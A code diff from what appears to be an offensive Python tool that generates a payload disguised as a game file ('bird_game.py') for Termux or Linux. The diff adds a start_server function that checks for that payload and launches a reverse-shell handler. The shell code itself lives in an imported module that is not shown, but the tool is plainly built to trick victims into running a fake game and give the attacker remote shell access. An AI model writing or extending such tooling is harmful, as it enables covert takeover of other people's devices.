@@ -17,6 +17,8 @@ import requests
 import platform
 from tqdm import *
 from server_host.tool import *
+from pathlib import Path
+from server_host.session import *
 '''def functions'''
 
 def help_menu():
@@ -142,8 +144,13 @@ class payload:
             print(f"  {c}[{g}+{c}] {g}Done")
             print(f"  {c}[{g}!{c}] {y}paylaod saved to {r}payloads{v}/{r}Termux{v}/{r}bird_game.py")
 
-'''
-def start_srver():
-    try:
-       payload_check = open("payload/Termux/") 
-'''
+
+def start_server():
+    payload_check_termux = (Path.cwd() / 'payloads' / 'Termux' / 'bird_game.py').exists() 
+    payload_check_linux =(Path.cwd() / 'payloads' / 'Linux' / 'bird_game.py').exists() 
+    if payload_check_linux == True :
+        reverse_shell_exec()
+    elif payload_check_termux == True:
+        reverse_shell_exec()
+    else :
+        print(f" {c}[{y}?{c}] {r}you need to creat a {y}payload{r} first to start a server")
